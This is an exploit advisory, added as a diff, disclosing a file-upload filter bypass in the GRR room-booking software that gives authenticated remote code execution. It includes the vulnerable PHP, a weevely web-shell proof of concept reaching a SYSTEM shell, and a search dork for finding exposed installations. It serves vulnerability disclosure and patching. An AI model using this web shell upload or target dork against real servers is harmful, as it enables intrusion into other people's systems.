@@ -1,0 +1,183 @@
+# Exploit Title: GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenticated)
+
+# Date: January 7th, 2016
+# Exploit Author: kmkz (Bourbon Jean-marie) | @kmkz_security
+# Vendor Homepage: http://grr.devome.com/fr/
+# Software Link: http://grr.devome.com/fr/telechargement/category/3-versions-patch?download=7:grr-3-0-0-rc1
+# Version: 3.0.0-RC1
+# Tested on: Windows 2003 R2, PHP 5.2.6
+# Dork: inurl:/grr/ intext:réservation intitle:"GRR"
+
+# CVSS score: 9.9
+# OVE ID: OVE-20160705-0044
+# CVE ID: Not Requested
+
+# Credits: http://www.kaizendo.fr/php-how-to-manage-uploaded-image-in-secure-way/
+# Fix:     https://github.com/JeromeDevome/GRR/blob/master/admin/admin_config1.php
+
+
+I. APPLICATION
+======================================================================================
+
+GRR is an open source resources manager tool used in many french public
+institutions (not only!).
+It permit for example to manage rooms reservations, and so much more.
+
+
+II. ADVISORY
+======================================================================================
+ 
+ 
+The application allows administrators to change the enterprise's logo
+uploading a new image with .png,.jpg or .gif extension only.
+ 
+Once uploaded, image name is "splitted" in an array and renamed with the
+name "logo" followed by the extention saved as 2nd array's element.
+ 
+This file called for example "logo.jpg" is also "chmoded" as 0666 permission
+and directly accessible in image folder (img_grr by default) by all users.
+ 
+Besides, the application does only a basic conditional php test
+on the extension of the uploaded file.
+ 
+It's possible for an attacker to add a second extension that will be
+used when the image will be renamed in order to bypass this basic filter
+(double extension upload filter bypassing).
+ 
+So, a file called backdoor.php.jpg will be renamed as logo.php with
+chmod 0666 permissions and could be used by attacker to gain more privileges
+on the targeted server (privesc due to bad file permissions and RCE).
+ 
+To trigger this vulnerability it is necessary to have an administrator
+account on the GRR application.
+ 
+This vulnerability is a combination of 3 issues:
+- predictable uploaded file names and path
+- upload of any kind of file
+- bad files permission when we upload this file that permit us to gain
+privilegied access.
+ 
+Note that it could be "dorkable" in order to find targets ... and sometimes
+with trivial admin credentials ;-).
+ 
+III. VULNERABLE CODE
+======================================================================================
+
+snip..
+// Enregistrement du logo
+    $doc_file = isset($_FILES["doc_file"]) ? $_FILES["doc_file"] : NULL;
+    if (preg_match("`\.([^.]+)$`", $doc_file['name'], $match))
+    {
+        $ext = strtolower($match[1]);
+        if ($ext != 'jpg' && $ext != 'png' && $ext != 'gif') // Vulnerability !! Extension are the only "security" test on submitted files !!
+        {
+    $msg .= "L\'image n\'a pas pu être enregistrée : les seules extentions autorisées sont gif, png et jpg.\\n";
+    $ok = 'no';
+}
+else
+{
+    $dest = '../images/';
+    $ok1 = false;
+    if ($f = @fopen("$dest/.test", "w"))
+    {
+        @fputs($f, '<'.'?php $ok1 = true; ?'.'>'); // Hem...
+        @fclose($f);
+        include("$dest/.test");
+    }
+    if (!$ok1)
+    {
+        $msg .= "L\'image n\'a pas pu être enregistrée : problème d\'écriture sur le répertoire \"images\". Veuillez signaler ce problème à l\'administrateur du serveur.\\n";
+        $ok = 'no';
+    }
+    else
+    {
+        $ok1 = @copy($doc_file['tmp_name'], $dest.$doc_file['name']);
+        if (!$ok1)
+            $ok1 = @move_uploaded_file($doc_file['tmp_name'], $dest.$doc_file['name']);
+        if (!$ok1)
+        {
+            $msg .= "L\'image n\'a pas pu être enregistrée : problème de transfert. Le fichier n\'a pas pu être transféré sur le répertoire IMAGES. Veuillez signaler ce problème à l\'administrateur du serveur.\\n";
+            $ok = 'no';
+        }
+        else
+        {
+            $tab = explode(".", $doc_file['name']);
+            $ext = strtolower($tab[1]);
+            if ($dest.$doc_file['name']!=$dest."logo.".$ext)
+            {
+                if (@file_exists($dest."logo.".$ext))
+                    @unlink($dest."logo.".$ext);
+                rename($dest.$doc_file['name'],$dest."logo.".$ext); // Vulnerability: if filename is "backdoor.php.jpg" we rename it as "logo.php" !!
+
+            }
+            @chmod($dest."logo.".$ext, 0666); // Vulnerability: why chmod 0666 on this f****** file!?!?
+
+            $picture_room = "logo.".$ext;
+            if (!Settings::set("logo", $picture_room))
+            {
+                $msg .= "Erreur lors de l'enregistrement du logo !\\n";
+                $ok = 'no';
+            }
+        }
+    }
+}
+snip...
+ 
+IV. PROOF OF CONCEPT
+======================================================================================
+ 
+Generate backdoor:
+ 
+    kmkz@Tapz:~#  weevely generate pass123 /tmp/3lrvs.php
+    Generated backdoor with password 'pass123' in '/tmp/3lrvs.php' of 1486 byte size.
+    kmkz@Tapz:~# mv /tmp/3lrvs.php /tmp/3lrvs.php.jpg
+ 
+ 
+Login as admin and upload this new 'logo' > Administration > logo
+ 
+Enjoy your shell!
+ 
+    kmkz@Tapz:~# weevely http://server/images/logo.php pass123
+    [+] weevely 3.2.0
+ 
+    [+] Target:    server:F:\server\grr\images
+    [+] Session:    /kmkz/.weevely/sessions/laboratoire.target.fr/logo_1.session
+    [+] Shell:    System shell
+ 
+    [+] Browse the filesystem or execute commands starts the connection
+    [+] to the target. Type :help for more information.
+ 
+    weevely> whoami
+    autorite nt\system
+ 
+ 
+ 
+V. RISK
+======================================================================================
+By uploading a script, an attacker may be able to execute arbitrary code
+on the server with elevated privileges.
+ 
+This flaw may compromise the integrity of the system
+(with access to sensitive informations, network shares...) and it may conduce
+to  full information system's compromise using pivots techniques and imagination!
+ 
+ 
+VI. VERSIONS AFFECTED
+======================================================================================
+GRR 3.0.0-RC1 is vulnerable (and all previous versions)
+ 
+ 
+VII. TIMELINE
+======================================================================================
+December 17th, 2015: Vulnerability identification
+January 7th, 2016: Vendor and project developers notification
+January 11th, 2016: Project developers response
+January 15th, 2016: Patch release
+January 17th, 2016: Public disclosure
+
+
+VII. LEGAL NOTICES
+======================================================================================
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of this advisory.
